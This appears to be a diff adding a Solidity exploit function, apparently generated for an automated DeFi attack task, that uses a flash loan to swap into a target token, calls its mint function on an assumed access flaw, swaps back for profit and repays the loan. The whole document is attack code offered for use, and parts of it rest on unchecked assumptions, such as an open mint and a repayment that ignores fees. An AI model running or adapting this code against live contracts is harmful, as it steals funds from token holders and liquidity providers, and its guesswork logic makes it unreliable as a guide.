@@ -1,0 +1,47 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Obtain the CoinToken from the target
+    ICoinToken coinToken = ICoinToken(target);
+    
+    // Flash Loan received tokens
+    uint256 borrowedAmount = amount;
+
+    // 1. Swap half of the borrowed tokens (valuableToken) for CoinToken
+    uint256 amountToSwap = borrowedAmount / 2;
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(coinToken);
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amountToSwap,
+        0, // accept any amount of CoinToken 
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 2. Mint new CoinTokens by sending a small amount to the mint function
+    // For this, we'll assume the mint function allows this for an existing user
+    coinToken.mint(address(this), 1e18); // Mint 1 token (adjust based on CoinToken's decimals)
+
+    // 3. Swap the new CoinTokens back to valuableToken to keep a profit 
+    uint256 coinTokenBalance = coinToken.balanceOf(address(this));
+    path[0] = address(coinToken);
+    path[1] = address(valuableToken);
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        coinTokenBalance,
+        0, // accept any amount of valuableToken
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // 4. Repay flashloan plus fee (if applicable) based on the original borrowed amount
+    // The amount should be returned in the original token's format, so convert accordingly
+    uint256 valuableTokenBalance = valuableToken.balanceOf(address(this));
+    require(valuableTokenBalance >= borrowedAmount, "Not enough valuableToken to repay loan");
+
+    valuableToken.transfer(flashloanProvider, borrowedAmount);
+}
+</executeExploitCode>
+```
